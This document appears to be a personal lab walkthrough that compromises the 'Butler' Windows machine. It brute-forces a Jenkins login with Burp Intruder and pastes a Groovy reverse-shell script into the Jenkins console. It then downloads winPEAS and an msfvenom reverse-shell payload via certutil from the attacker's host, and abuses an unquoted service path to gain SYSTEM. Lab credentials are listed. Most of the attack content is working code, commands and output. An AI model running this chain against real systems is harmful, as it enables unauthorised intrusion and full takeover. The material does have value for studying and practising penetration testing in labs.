
#privilegeescalation
#hackwindows


LowPrivilegeUser - butler: JeNkIn5@44
Admin - administrator: A%rc!BcA!

Ip address 192.168.64.7

nmap scan

```
──(root㉿kali)-[~]
└─# nmap -A -p- -T4 -oN nmapbutler2.txt 192.168.64.7 
Starting Nmap 7.94 ( https://nmap.org ) at 2024-07-08 14:41 PDT
Nmap scan report for 192.168.64.7
Host is up (0.0022s latency).
Not shown: 65524 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
8080/tcp  open  http          Jetty 9.4.41.v20210516
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(9.4.41.v20210516)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 22:28:3C:93:D3:67 (Unknown)
Device type: general purapose
Running: Microsoft Windows 10
OS CPE: cpe:/o:microsoft:windows_10
OS details: Microsoft Windows 10 1709 - 1909
Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-07-09T00:50:24
|_  start_date: N/A
|_nbstat: NetBIOS name: BUTLER, NetBIOS user: <unknown>, NetBIOS MAC: 22:28:3c:93:d3:67 (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: 2h59m58s

TRACEROUTE
HOP RTT     ADDRESS
1   2.24 ms 192.168.64.7

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 524.40 seconds

┌──(root㉿kali)-[~]

```



## Exploit Port 8080

#exploit8080 

- http://192.168.64.7:8080

#jenkins
	- ![[Pasted image 20240708183417.png]]

#attackjenkins
- https://github.com/gquere/pwn_jenkins
- https://hacktricks.boitatech.com.br/pentesting/pentesting-web/jenkins
- https://hacktricks.boitatech.com.br/pentesting/pentesting-web/jenkins

default credential of Jenkins is admin/password but not working
We can brute force access it using burp suite


![[Pasted image 20240708185535.png]]


Send to repeater then send to intruder

![[Pasted image 20240708190618.png]]

#burpsuiteintruder
#clusterbomb

1. Choose clusterbomb
2. Clear
3. Doubleclick the username and add
4. Doubleclick the password and add
5. Start attack

clusterbomb - every single user with every single password
use different combinations

![[Pasted image 20240708191821.png]]


Payload 2

![[Pasted image 20240708191940.png]]

![[Pasted image 20240708192040.png]]


Check the length of the response

![[Pasted image 20240708192636.png]]

Here is the difference in the response

no session cookie, length = 315

![[Pasted image 20240708192759.png]]

there is session cookie ; length = 309

![[Pasted image 20240708192906.png]]

Since there is a session cookie now when we tried Jenkins as username and Jenkins as password. Let's try to log in now as jenkins/jenkins

We were able to log in.

![[Pasted image 20240708193156.png]]

![[Pasted image 20240708193449.png]]

#groovyreverseshell #revershelljenkins #exploitgroovyreverseshell
#githubgroovyreverseshell

Source:
- https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6
- https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76 - githubgroovyreverseshell

Copy the script in the script console of jenkins

```
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

jenkins script console with reverse shell below

![[Pasted image 20240708194235.png]]

Run nc -nvlp 8044 in your machine then  run the script in jenkins

```
┌──(root㉿kali)-[~]
└─# nc -nvlp 8044                                   
listening on [any] 8044 ...

```


![[Pasted image 20240708194618.png]]

Check `systeminfo` of the machine to enumerate

```
C:\Program Files\Jenkins>systeminfo
systeminfo

Host Name:                 BUTLER
OS Name:                   Microsoft Windows 10 Enterprise Evaluation
OS Version:                10.0.19043 N/A Build 19043
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          butler
Registered Organization:   
Product ID:                00329-20000-00001-AA079
Original Install Date:     8/14/2021, 3:51:38 AM
System Boot Time:          7/8/2024, 7:01:31 PM
System Manufacturer:       QEMU
System Model:              Standard PC (Q35 + ICH9, 2009)
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 15 Model 107 Stepping 1 AuthenticAMD ~1000 Mhz
BIOS Version:              EFI Development Kit II / OVMF 0.0.0, 2/6/2015
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     2,045 MB
Available Physical Memory: 1,569 MB
Virtual Memory: Max Size:  3,197 MB
Virtual Memory: Available: 2,363 MB
Virtual Memory: In Use:    834 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 4 Hotfix(s) Installed.
                           [01]: KB4601554
                           [02]: KB5000736
                           [03]: KB5001330
                           [04]: KB5001405
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Ethernet 2
                                 DHCP Enabled:    Yes
                                 DHCP Server:     192.168.64.1
                                 IP address(es)
                                 [01]: 192.168.64.7
                                 [02]: fe80::617e:9fd5:8bfa:b78f
                                 [03]: fd7b:a420:b5d1:f991:95d1:b628:96fd:1f60
                                 [04]: fd7b:a420:b5d1:f991:617e:9fd5:8bfa:b78f
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

```


#winpeas
#privilegescalationwindows

>> Search winpeas in google and download the latest bersion

#downloadwinpeas

https://github.com/peass-ng/PEASS-ng/releases/tag/20240707-68b6f322

Use the winpeasx64

- winPEASx64.exe 

Make your kali as python http server

```
┌──(root㉿kali)-[~]
└─# mv Downloads/winPEASx64.exe /transfer/

┌──(root㉿kali)-[~]
└─# cd /transfer 

┌──(root㉿kali)-[/transfer]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.64.7 - - [08/Jul/2024 16:59:58] "GET /winPEASx64.exe HTTP/1.1" 200 -
192.168.64.7 - - [08/Jul/2024 16:59:59] "GET /winPEASx64.exe HTTP/1.1" 200 -

```


Download the winPEASx64.exe from your kali to the windows.

1. Make sure you are in the directorry where you can access the file. You can go to `c:\users\butler`. 
3. Use the command `certutil.exe -urlcache -f http://192.168.64.4/winPEASx64.exe winpeas.exe` to download thw winPEASx64.exe as winpeas.exe

```
C:\Program Files\Jenkins>cd c:\users
cd c:\users

c:\Users>cd butler
cd butler

c:\Users\butler>dir 
dir
 Volume in drive C has no label.
 Volume Serial Number is 1067-CB24

 Directory of c:\Users\butler

07/08/2024  02:28 PM    <DIR>          .
07/08/2024  02:28 PM    <DIR>          ..
08/14/2021  05:16 AM    <DIR>          .groovy
08/14/2021  04:54 AM    <DIR>          3D Objects
08/14/2021  04:54 AM    <DIR>          Contacts
08/14/2021  04:54 AM    <DIR>          Desktop
08/14/2021  04:54 AM    <DIR>          Documents
08/14/2021  05:23 AM    <DIR>          Downloads
08/14/2021  04:54 AM    <DIR>          Favorites
08/14/2021  04:54 AM    <DIR>          Links
08/14/2021  04:54 AM    <DIR>          Music
08/14/2021  04:56 AM    <DIR>          OneDrive
08/14/2021  04:55 AM    <DIR>          Pictures
08/14/2021  04:54 AM    <DIR>          Saved Games
08/14/2021  04:55 AM    <DIR>          Searches
08/14/2021  04:54 AM    <DIR>          Videos
               0 File(s)              0 bytes
              16 Dir(s)  12,394,033,152 bytes free

c:\Users\butler>certutil.exe -urlcache -f http://192.168.64.4/winPEASx64.exe winpeas.exe
certutil.exe -urlcache -f http://192.168.64.4/winPEASx64.exe winpeas.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

c:\Users\butler>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 1067-CB24

 Directory of c:\Users\butler

07/08/2024  07:59 PM    <DIR>          .
07/08/2024  07:59 PM    <DIR>          ..
08/14/2021  05:16 AM    <DIR>          .groovy
08/14/2021  04:54 AM    <DIR>          3D Objects
08/14/2021  04:54 AM    <DIR>          Contacts
08/14/2021  04:54 AM    <DIR>          Desktop
08/14/2021  04:54 AM    <DIR>          Documents
08/14/2021  05:23 AM    <DIR>          Downloads
08/14/2021  04:54 AM    <DIR>          Favorites
08/14/2021  04:54 AM    <DIR>          Links
08/14/2021  04:54 AM    <DIR>          Music
08/14/2021  04:56 AM    <DIR>          OneDrive
08/14/2021  04:55 AM    <DIR>          Pictures
08/14/2021  04:54 AM    <DIR>          Saved Games
08/14/2021  04:55 AM    <DIR>          Searches
08/14/2021  04:54 AM    <DIR>          Videos
07/08/2024  07:59 PM         2,387,456 winpeas.exe
               1 File(s)      2,387,456 bytes
              16 Dir(s)  12,389,249,024 bytes free

```

executing winpeas.exe, please see the results below

![[Pasted image 20240708201429.png]]


We saw executable service

![[Pasted image 20240708201859.png]]

The `C:\Program FIles (x86)\Wise\Wise Case 365\BootTime.exe` is unquoted, it means that we can input some malicious executable files in between caus its not quoted and treat each as separately

![[Pasted image 20240708202418.png]]

#msfvenom
#injectmalware
#unquotedinjectmalware
1. Inject malware from the kali 
	- From kali execute `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.64.4 LPORT=7777 -f exe > Wise.exe`
	- Make your kali as python http server to transfer it to the `C:\Program FIles (x86)\Wise

```
┌──(root㉿kali)-[~/Downloads]
└─# cd /transfer 

┌──(root㉿kali)-[/transfer]
└─# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.64.4 LPORT=7777 -f exe > Wise.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes


┌──(root㉿kali)-[/transfer]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.64.7 - - [08/Jul/2024 17:35:48] "GET /Wise.exe HTTP/1.1" 200 -
192.168.64.7 - - [08/Jul/2024 17:35:49] "GET /Wise.exe HTTP/1.1" 200 -

```

- Now go to `C:\Program Files (x86)\Wise`then download the malware you got from kali  `certutil -utlcache -f http://192.168.64.4/Wise.exe Wise.exe`
- Stop and start the service while doing the reverseshell nc -nvlp 7777

```
C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 1067-CB24

 Directory of C:\

12/07/2019  02:14 AM    <DIR>          PerfLogs
07/08/2024  01:41 PM    <DIR>          Program Files
02/04/2023  07:51 PM    <DIR>          Program Files (x86)
08/14/2021  05:29 AM    <DIR>          Users
02/04/2023  08:18 PM    <DIR>          Windows
               0 File(s)              0 bytes
               5 Dir(s)  12,388,593,664 bytes free

C:\>cd Program Files (x86)
cd Program Files (x86)

C:\Program Files (x86)>cd Wise  
cd Wise

C:\Program Files (x86)\Wise>certutil -utlcache -f http://192.168.64.4/Wise.exe Wise.exe
certutil -utlcache -f http://192.168.64.4/Wise.exe Wise.exe
CertUtil: Unknown arg: -utlcache


CertUtil -?              -- Display a verb list (command list)
CertUtil -dump -?        -- Display help text for the "dump" verb
CertUtil -v -?           -- Display all help text for all verbs


C:\Program Files (x86)\Wise>certutil -urlcache -f http://192.168.64.4/Wise.exe Wise.exe
certutil -urlcache -f http://192.168.64.4/Wise.exe Wise.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

C:\Program Files (x86)\Wise>sc stop WiseBootAssistant
sc stop WiseBootAssistant

SERVICE_NAME: WiseBootAssistant 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 3  STOP_PENDING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x3
        WAIT_HINT          : 0x1388

C:\Program Files (x86)\Wise>sc query WiseBootAssistant
sc query WiseBootAssistant

SERVICE_NAME: WiseBootAssistant 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 1  STOPPED 
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

C:\Program Files (x86)\Wise>sc start WiseBootAssistant
sc start WiseBootAssistant
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.


C:\Program Files (x86)\Wise>

```

- While you start the service `sc start WiseBootAssistant` listen to your kali via `nc -nvlp 7777`
- Now you got the nt authority system
```
┌──(root㉿kali)-[/transfer]
└─# nc -nvlp 7777
listening on [any] 7777 ...
connect to [192.168.64.4] from (UNKNOWN) [192.168.64.7] 49705
Microsoft Windows [Version 10.0.19043.928]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

```